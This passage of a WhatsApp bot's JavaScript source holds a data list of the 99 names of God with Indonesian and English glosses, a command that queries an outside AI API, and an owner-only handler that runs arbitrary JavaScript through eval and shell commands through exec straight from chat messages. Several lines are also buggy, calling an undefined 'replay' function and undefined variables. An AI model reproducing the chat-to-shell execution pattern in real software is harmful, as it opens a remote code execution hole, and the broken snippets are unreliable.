        arabic: "اَلْمُمِيتُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mematikan",
        translation_en: "The Bringer of Death, the Destroyer"
    },
    {
        index: 62,
        latin: "Al Hayyu",
        arabic: "الْحَيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Hidup",
        translation_en: "The Ever Living"
    },
    {
        index: 63,
        latin: "Al Qayyuum",
        arabic: "الْقَيُّومُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mandiri",
        translation_en: "The Self Subsisting Sustainer of All"
    },
    {
        index: 64,
        latin: "Al Waajid",
        arabic: "الْوَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penemu",
        translation_en: "The Perceiver, the Finder, the Unfailing"
    },
    {
        index: 65,
        latin: "Al Maajid",
        arabic: "الْمَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Illustrious, the Magnificent"
    },
    {
        index: 66,
        latin: "Al Wahiid",
        arabic: "الْواحِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tunggal",
        translation_en: "The One, The Unique, Manifestation of Unity"
    },
    {
        index: 67,
        latin: "Al ‘Ahad",
        arabic: "اَلاَحَدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Esa",
        translation_en: "The One, the All Inclusive, the Indivisible"
    },
    {
        index: 68,
        latin: "As Shamad",
        arabic: "الصَّمَدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaDibutuhkan, Tempat Meminta",
        translation_en: "The Self Sufficient, the Impregnable,the Eternally Besought of All, the Everlasting"
    },
    {
        index: 69,
        latin: "Al Qaadir",
        arabic: "الْقَادِرُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMenentukan, Maha Menyeimbangkan",
        translation_en: "The All Able"
    },
    {
        index: 70,
        latin: "Al Muqtadir",
        arabic: "الْمُقْتَدِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkuasa",
        translation_en: "The All Determiner, the Dominant"
    },
    {
        index: 71,
        latin: "Al Muqaddim",
        arabic: "الْمُقَدِّمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendahulukan",
        translation_en: "The Expediter, He who brings forward"
    },
    {
        index: 72,
        latin: "Al Mu’akkhir",
        arabic: "الْمُؤَخِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengakhirkan",
        translation_en: "The Delayer, He who puts far away"
    },
    {
        index: 73,
        latin: "Al Awwal",
        arabic: "الأوَّلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Awal",
        translation_en: "The First"
    },
    {
        index: 74,
        latin: "Al Aakhir",
        arabic: "الآخِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Akhir",
        translation_en: "The Last"
    },
    {
        index: 75,
        latin: "Az Zhaahir",
        arabic: "الظَّاهِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Nyata",
        translation_en: "The Manifest; the All Victorious"
    },
    {
        index: 76,
        latin: "Al Baathin",
        arabic: "الْبَاطِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Ghaib",
        translation_en: "The Hidden; the All Encompassing"
    },
    {
        index: 77,
        latin: "Al Waali",
        arabic: "الْوَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memerintah",
        translation_en: "The Patron"
    },
    {
        index: 78,
        latin: "Al Muta’aalii",
        arabic: "الْمُتَعَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Self Exalted"
    },
    {
        index: 79,
        latin: "Al Barri",
        arabic: "الْبَرُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penderma",
        translation_en: "The Most Kind and Righteous"
    },
    {
        index: 80,
        latin: "At Tawwaab",
        arabic: "التَّوَابُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penerima Tobat",
        translation_en: "The Ever Returning, Ever Relenting"
    },
    {
        index: 81,
        latin: "Al Muntaqim",
        arabic: "الْمُنْتَقِمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penuntut Balas",
        translation_en: "The Avenger"
    },
    {
        index: 82,
        latin: "Al Afuww",
        arabic: "العَفُوُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemaaf",
        translation_en: "The Pardoner, the Effacer of Sins"
    },
    {
        index: 83,
        latin: "Ar Ra`uuf",
        arabic: "الرَّؤُوفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengasih",
        translation_en: "The Compassionate, the All Pitying"
    },
    {
        index: 84,
        latin: "Malikul Mulk",
        arabic: "مَالِكُ الْمُلْكِ",
        translation_id: "Yang Memiliki Mutlak sifatPenguasa Kerajaan (Semesta)",
        translation_en: "The Owner of All Sovereignty"
    },
    {
        index: 85,
        latin: "Dzul JalaaliWal Ikraam",
        arabic: "ذُوالْجَلاَلِوَالإكْرَامِ",
        translation_id: "Yang Memiliki Mutlak sifat PemilikKebesaran dan Kemuliaan",
        translation_en: "The Lord of Majesty and Generosity"
    },
    {
        index: 86,
        latin: "Al Muqsith",
        arabic: "الْمُقْسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Equitable, the Requiter"
    },
    {
        index: 87,
        latin: "Al Jamii’",
        arabic: "الْجَامِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengumpulkan",
        translation_en: "The Gatherer, the Unifier"
    },
    {
        index: 88,
        latin: "Al Ghaniyy",
        arabic: "الْغَنِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkecukupan",
        translation_en: "The All Rich, the Independent"
    },
    {
        index: 89,
        latin: "Al Mughnii",
        arabic: "الْمُغْنِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Kekayaan",
        translation_en: "The Enricher, the Emancipator"
    },
    {
        index: 90,
        latin: "Al Maani",
        arabic: "اَلْمَانِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mencegah",
        translation_en: "The Withholder, the Shielder, the Defender"
    },
    {
        index: 91,
        latin: "Ad Dhaar",
        arabic: "الضَّارَّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Derita",
        translation_en: "The Distressor, the Harmer"
    },
    {
        index: 92,
        latin: "An Nafii’",
        arabic: "النَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Manfaat",
        translation_en: "The Propitious, the Benefactor"
    },
    {
        index: 93,
        latin: "An Nuur",
        arabic: "النُّورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Bercahaya(Menerangi, Memberi Cahaya)",
        translation_en: "The Light"
    },
    {
        index: 94,
        latin: "Al Haadii",
        arabic: "الْهَادِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Petunjuk",
        translation_en: "The Guide"
    },
    {
        index: 95,
        latin: "Al Baadii",
        arabic: "الْبَدِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencipta",
        translation_en: "Incomparable, the Originator"
    },
    {
        index: 96,
        latin: "Al Baaqii",
        arabic: "اَلْبَاقِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kekal",
        translation_en: "The Ever Enduring and Immutable"
    },
    {
        index: 97,
        latin: "Al Waarits",
        arabic: "الْوَارِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pewaris",
        translation_en: "The Heir, the Inheritor of All"
    },
    {
        index: 98,
        latin: "Ar Rasyiid",
        arabic: "الرَّشِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pandai",
        translation_en: "The Guide, Infallible Teacher, and Knower"
    },
    {
        index: 99,
        latin: "As Shabuur",
        arabic: "الصَّبُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Sabar",
        translation_en: "The Patient"
    }
]
    let json = JSON.parse(JSON.stringify(asmaulhusna))
    let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
    if (isNaN(args[0])) return replay(`contoh:\nasmaulhusna 1`)
    if (args[0]) {
        if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
        let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
        return replay(`No. ${index}
*ARABIAN* : ${arabic}
*LATIN* : ${latin}
> INNDONESIA : ${translation_id}
> ENGLISH : ${translation_en}
`.trim())
    }
    replay(`${contoh} + ${data} + ${anjuran}`)
}
break

case'zeta':{
if (!text) return reply(`*Example :* ${prefix + command} Haiii, Perkenalkan Dirimu`)
let zeta = await fetchJson(`https://api.kyuurzy.site/api/ai/aizeta?query=${text}`)
kalz.sendMessage(m.chat, { text : `${zeta.result.answer}`},{quoted:m})
}
break
//=================================================//
default:
if (budy.startsWith('=>')) {
if (!isCreator) return false
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return reply(bang)}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return false
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await reply(String(err))}}
if (budy.startsWith('$')) {
if(!isCreator) return false
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)})}

if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum",].includes(budy) && !isCmd) {
reply(`*Waalaikummussalam warahmatullahi wabarokatuh*\n\n\n_📚 Baca yang dibawah ya!_
"Orang yang mengucapkan salam seperti ini maka ia mendapatkan 30 pahala, kemudian, orang yang dihadapan atau mendengarnya membalas dengan kalimat yang sama yaitu “Wa'alaikum salam warahmatullahi wabarakatuh atau ditambah dengan yang lain (waridhwaana). Artinya selain daripada do'a selamat juga meminta pada Allah SWT`)
}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
kalz.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
